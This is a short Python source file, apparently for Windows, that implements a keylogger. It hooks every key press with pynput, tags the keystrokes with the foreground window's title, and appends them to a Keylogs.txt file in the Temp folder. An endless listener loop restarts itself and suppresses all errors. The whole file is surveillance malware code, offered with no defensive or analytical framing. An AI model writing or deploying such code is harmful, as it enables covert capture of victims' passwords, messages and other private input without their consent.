# Import modules

import os
from threading import Thread
from win32gui import GetWindowText, GetForegroundWindow
try:
	from pynput.keyboard import Key, Listener
except ImportError:
	raise SystemExit('Please run › pip install pynput')



# Define variables for keylogger

Count = 0
Keys = []
WindowsTitle = ''


# Detected Button Definition

def Keyboard(Key):
	global Count, Keys

	Keys.append(Key)
	Count += 1

	if Count >= 1:
		WriteFile(Keys)
		Keys = [] 
		Count = 0


# Writing pressed buttons to a file

def WriteFile(Key):
	with open(os.getenv('Temp') + '\\Keylogs.txt', 'a', encoding='utf-8') as f:
		global WindowsTitle
		if WindowsTitle != GetWindowText(GetForegroundWindow()):
			f.write(('\n\n' + GetWindowText(GetForegroundWindow()) + '\n'))
		if str(Key).find('space') >= 0:
			f.write('\n') 
		elif str(Key).find('Key') == -1:
			Key = str(Key[0]).replace("'", '')
		try:
			f.write(Key)
		except:
			pass

		WindowsTitle = GetWindowText(GetForegroundWindow())


# Listener function

def Threader():
	while True:
		try:
			with Listener(on_press=Keyboard) as listener:
				listener.join()
		except:
			pass